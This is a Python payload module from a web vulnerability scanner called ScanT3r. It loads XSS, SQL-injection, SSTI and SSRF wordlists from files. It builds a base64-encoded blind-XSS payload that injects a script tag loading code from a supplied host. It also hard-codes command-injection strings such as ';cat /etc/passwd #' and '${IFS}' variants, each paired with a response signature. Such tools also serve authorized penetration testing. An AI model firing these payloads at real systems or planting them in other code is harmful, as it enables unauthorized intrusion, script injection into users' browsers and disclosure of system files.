__name__ = 'ScanT3r'
__author__ = 'Khaled Nassar'
__email__ = 'knassar702@gmail.com'
__version__ = '0.7#Beta'

from base64 import b64encode
from yaml import safe_load

class XSS:
    def __init__(self,host=None):
        self.payloads = list(open('wordlists/txt/xss.txt','r'))
        self.blind_payloads = open('wordlists/txt/bxss.txt','r')
        self.blind = []
        if host:
            b = b64encode(f'var a=document.createElement("script");a.src="{host}";document.body.appendChild(a);'.encode('utf-8')).decode('utf-8').replace('=','')
            for blind_payload in self.blind_payloads:
                new_payload = blind_payload.replace("{host}",host).replace('{b64_host}',b)
                self.payloads.append(new_payload)

sqli_payloads = open('wordlists/sqli.txt','r')
sql_err = open('wordlists/sqli_errors.txt','r')

def rce_payloads(): 
    f = {
     ';id #':'gid=',
     ';cat /etc/passwd #':'bin:x:2:2:bin:/bin:/usr/sbin/nologin',
     '|id #':'gid=',
     '|cat /etc/passwd #':'bin:x:2:2:bin:/bin:/usr/sbin/nologin',
     '''
id #''':'gid=',
     '''
cat /etc/passwd #''':'bin:x:2:2:bin:/bin:/usr/sbin/nologin',
      '''
cat${IFS}/etc/passwd #''':'bin:x:2:2:bin:/bin:/usr/sbin/nologin',
      ';id':'gid=',
      ';cat /etc/passwd':'bin:x:2:2:bin:/bin:/usr/sbin/nologin',
      '|id':'gid=',
      '|cat /etc/passwd':'bin:x:2:2:bin:/bin:/usr/sbin/nologin',
      '''
id''':'gid=',
      '''
cat /etc/passwd''':'bin:x:2:2:bin:/bin:/usr/sbin/nologin',
      '''
cat${IFS}/etc/passwd''':'bin:x:2:2:bin:/bin:/usr/sbin/nologin'
      }

    return f


def ssti_payloads():
    f = safe_load(open('wordlists/match/ssti.yaml','r'))
    return f


def ssrf_parameters():
    f = open('wordlists/txt/ssrf_parameters.txt','r').read().splitlines() 
    return f
